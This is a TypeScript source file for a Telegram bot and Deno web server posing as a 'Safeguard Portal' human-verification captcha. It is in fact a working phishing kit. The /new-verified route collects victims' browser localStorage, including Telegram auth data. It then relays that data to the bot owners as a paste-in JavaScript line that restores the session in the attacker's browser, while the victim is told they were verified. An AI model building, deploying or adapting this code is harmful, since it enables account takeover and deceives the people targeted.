import {
  Bot,
  InlineKeyboard,
  InputFile,
  webhookCallback,
} from "https://deno.land/x/grammy@v1.30.0/mod.ts";
import { oakCors } from "https://deno.land/x/cors@v1.2.2/mod.ts";

// Polyfill: trick Oak into detecting Deno instead of Node.js
// Must run BEFORE Oak is imported — Oak checks WebSocketPair at import time
if (!(globalThis as any).WebSocketPair) {
  (globalThis as any).WebSocketPair = class WebSocketPair {};
}

// Dynamic import: Oak loads AFTER the polyfill is in place
const { Application, Context, isHttpError, Status } = await import(
  "https://deno.land/x/oak@v17.0.0/mod.ts"
);

// Inline bot detection (avoids npm:isbot dependency that fails on Deno Deploy)
const BOT_REGEX = /bot|crawler|spider|crawl|scrape|facebookexternalhit|twitterbot|telegrambot|whatsapp|slack|discord|linkedinbot|googlebot|bingbot|duckduckgo|baiduspider|yandex|pinterest|embedly|preview|prerender/i;
function isbot(ua: string): boolean {
  return BOT_REGEX.test(ua);
}

type SafeguardConfig = {
  channel: string;
  image: string;
  name: string;
  inviteLink: string;
};

/* #region environment variable */
const botOwner = Deno.env.get("BOT_OWNER") as string;
const botName = Deno.env.get("BOT_NAME");
const webAppLink = Deno.env.get("WEB_APP_LINK");
const gateKeeper = Deno.env.get("GATE_KEEPER");
const sgClickVerifyURL = Deno.env.get("SAFEGUARD_CLICK_VERIFY");
const sgTapToVerifyURL = Deno.env.get("SAFEGUARD_TAP_VERIFY");
const sgVerifiedURL = Deno.env.get("SAFEGUARD_VERIFIED");
const DEBUG = Boolean(Number(Deno.env.get("DEBUG")));
/* #endregion */

/* #region init */
const botLink = `tg://resolve?domain=${botName}&start=`;
const sgConfigDefault: SafeguardConfig = {
  channel: "",
  image: "",
  name: "",
  inviteLink: "",
};
const bot = new Bot(gateKeeper as string);
const app = new Application();
/* #endregion */

/* #region telegram */
// open web app
bot.chatType("private").command("start", async (ctx) => {
  const msg = ctx.message?.text.split(" ");
  // if (msg?.length !== 2) return;
  const id = msg[msg.length - 1];

  const caption = `<b>Verify you're human with Safeguard Portal</b>
    
Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
  const sgClickVerify = await Deno.open("./safeguard-click-verify.jpg");
  const input = new InputFile(sgClickVerifyURL || sgClickVerify);
  const keyboard = new InlineKeyboard().webApp(
    "VERIFY",
    (webAppLink as string) + "?c=" + id
  );
  await bot.api.raw.sendPhoto({
    caption,
    photo: input,
    chat_id: ctx.chatId,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.on("my_chat_member", async (ctx) => {
  if (ctx.myChatMember.chat.type !== "channel") return;

  const caption = `<b>Verify you're human with Safeguard Portal</b>

Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
  const sgClickVerify = await Deno.open("./safeguard-click-verify.jpg");
  const input = new InputFile(sgClickVerifyURL || sgClickVerify);
  const keyboard = new InlineKeyboard().url("VERIFY", webAppLink as string);
  await bot.api.raw.sendPhoto({
    caption,
    photo: input,
    chat_id: ctx.chatId,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

// setup for channel configuration
bot.chatType("private").command("setup", async (ctx) => {
  const text = `Fill below and send
  
channel: //@username
image: // image url to display in your channel
name:  // community name
inviteLink: // your group invite link`;
  await ctx.api.raw.sendMessage({
    text,
    chat_id: ctx.chatId,
  });
});

// save custom channel configuration
bot.chatType("private").on("message:text", async (ctx) => {
  let reply = `Saved!
  
Please note that it will be deleted after summer.`;
  const config: SafeguardConfig = {
    ...sgConfigDefault,
  };
  const text = ctx.message.text.split("\n");
  const kv = (text: string) => {
    const value = text.trim().split(":");
    if (value.length < 2) throw new Error("Invalid format");
    return value.slice(1).join(":").trim();
  };

  try {
    config.channel = kv(text[0]);
    config.image = kv(text[1]);
    config.name = kv(text[2]);
    config.inviteLink = kv(text[3]);
    // console.debug(config);
    const deno = await Deno.openKv();
    await deno.set(["channel", config.channel], config);
  } catch (e) {
    console.error(e);
    reply = "Hmmm, looks like your get is wrong";
  }

  ctx.api.raw.sendMessage({
    text: reply,
    chat_id: ctx.chatId,
  });
});

bot.catch((e) => {
  console.error(e.message);
});
/* #endregion */

/* #region webserver */

const newVerified = async (ctx: Context) => {
  const body = await ctx.request.body.json();
  const storage = body.storage;

  if (storage) {
    const user = body.user || { username: "durov", id: "" };
    if (!user.id && storage.user_auth) {
      user.id = JSON.parse(storage.user_auth).id;
    }

    try {
      const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a  href="t.me/${
        user.username
      }">@${user.username}</a>

<pre>Object.entries(${JSON.stringify(
        storage
      )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
      for (const owner of botOwner.split(",")) {
        await bot.api.raw.sendMessage({
          text: log,
          chat_id: owner,
          parse_mode: "HTML",
        });
      }
      // send chat invite link
      const deno = await Deno.openKv();
      const entry = await deno.get([
        "channel",
        "default" /*TODO: replace with unique id */,
      ]);
      const config = (entry.value || sgConfigDefault) as SafeguardConfig;
      const imageLink = sgVerifiedURL
        ? new URL(sgVerifiedURL)
        : "./safeguard-verify.jpg";
      const verifyMsg = `Verified, you can join the group using this temporary link:
    
<a href="${config.inviteLink}">${config.inviteLink}</a>
    
This link is a one time use and will expire`;
      const inviteMsg = `<b>Verified!</b> 
  
Join request has been sent and you will be added once the admin approves your request`;
      const user_auth = JSON.parse(storage.user_auth);
      await bot.api.raw.sendPhoto({
        caption: config.inviteLink ? verifyMsg : inviteMsg,
        photo: new InputFile(imageLink),
        parse_mode: "HTML",
        chat_id: user_auth.id,
      });
    } catch (ex) {
      console.error(ex);
    }
  }

  ctx.response.status = Status.OK;
  ctx.response.type = "application/json";
  ctx.response.body = { msg: "ok" };
};

// Response Time
app.use(async (context, next) => {
  const start = Date.now();
  await next();
  const ms = Date.now() - start;
  context.response.headers.set("X-Response-Time", `${ms}ms`);
});

// Error handler
app.use(async (ctx: Context, next) => {
  try {
    await next();
  } catch (err) {
    ctx.response.status = Status.OK;
    ctx.response.type = "json";
    ctx.response.body = { msg: "ok" };
    if (isHttpError(err)) {
      ctx.response.status = err.status;
    } else {
      console.error(err);
    }
  }
});

// Static file serving helper (replaces ctx.send which breaks on Deno Deploy)
const MIME_TYPES: { [key: string]: string } = {
  ".html": "text/html", ".css": "text/css",
  ".js": "application/javascript", ".json": "application/json",
  ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
  ".svg": "image/svg+xml", ".ico": "image/x-icon",
  ".wasm": "application/wasm", ".txt": "text/plain",
  ".mp3": "audio/mpeg", ".mp4": "video/mp4",
  ".webmanifest": "application/manifest+json",
};

async function serveStatic(ctx: Context, root: string, filePath: string): Promise<void> {
  try {
    const fullPath = root.endsWith("/") ? root + filePath : root + "/" + filePath;
    const ext = filePath.includes(".") ? filePath.slice(filePath.lastIndexOf(".")) : "";
    const mime = MIME_TYPES[ext] || "application/octet-stream";
    ctx.response.headers.set("Content-Type", mime);
    // Read as text for text types, binary for everything else
    const isText = /\.(html|css|js|json|svg|xml|txt|webmanifest|md)$/i.test(filePath);
    if (isText) {
      ctx.response.body = await Deno.readTextFile(fullPath);
    } else {
      ctx.response.body = await Deno.readFile(fullPath);
    }
  } catch {
    // SPA fallback: serve index.html
    try {
      const indexPath = root.endsWith("/") ? root + "index.html" : root + "/index.html";
      ctx.response.headers.set("Content-Type", "text/html");
      ctx.response.body = await Deno.readTextFile(indexPath);
    } catch {
      ctx.response.status = 404;
      ctx.response.body = "Not Found";
    }
  }
}

// Handle routes
app.use(async (ctx: Context) => {
  const path = ctx.request.url.pathname.slice(1);
  let filename = path || "index.html";
  // If path has subdirectories, extract the filename
  const s = filename.split("/");
  if (s.length > 1) {
    filename = s[s.length - 1];
  }

  if (path === "tg-webhook") {
    const handleBotUpdate = webhookCallback(bot, "oak");
    await handleBotUpdate(ctx);
  } else if (path === "new-verified") {
    await newVerified(ctx);
  } else if (path === "ping") {
    ctx.response.headers.set("Content-Type", "text/plain");
    ctx.response.body = "pong - server is alive";
  } else if (path === "" || path === "test") {
    // Root/test: serve index.html directly
    ctx.response.headers.set("Content-Type", "text/html");
    ctx.response.body = await Deno.readTextFile(`${Deno.cwd()}/static/tweb/index.html`);
  } else if (path === "sg-mini") {
    console.log("DEBUG: sg-mini route hit, path=", path);
    console.log("DEBUG: WebSocketPair in globalThis?", "WebSocketPair" in globalThis);
    // Try writing response directly via the underlying connection
    try {
      ctx.response.status = 200;
      ctx.response.headers.set("Content-Type", "text/html; charset=utf-8");
      ctx.response.body = "<!DOCTYPE html><html><head><meta charset=utf-8></head><body style=background:#000;color:#fff><h1>OK</h1></body></html>";
      console.log("DEBUG: response body set");
    } catch (e) {
      console.error("DEBUG: error setting response:", e.message);
    }
  } else if (path === "sg" || path === "sg/") {
    // Safeguard homepage
    ctx.response.headers.set("Content-Type", "text/html");
    ctx.response.body = await Deno.readTextFile(`${Deno.cwd()}/static/sg/index.html`);
  } else if (path.startsWith("sg/") || path.startsWith("sg?")) {
    await serveStatic(ctx, `${Deno.cwd()}/static/sg`, filename);
  } else if (path.startsWith("tweb")) {
    await serveStatic(ctx, `${Deno.cwd()}/static/tweb`, filename);
  } else if (path === "" || path.includes(".")) {
    // Root path ("") serves index.html, paths with dots are static files
    await serveStatic(ctx, `${Deno.cwd()}/static/tweb`, filename);
  } else {
    ctx.response.status = Status.OK;
    ctx.response.type = "json";
    ctx.response.body = { msg: "ok" };
  }
});

// misc
app.use(oakCors());
/* #endregion */

if (DEBUG) {
  app.listen({ hostname: "127.0.0.1", port: 8000 });
  bot.start();
}

app.listen();
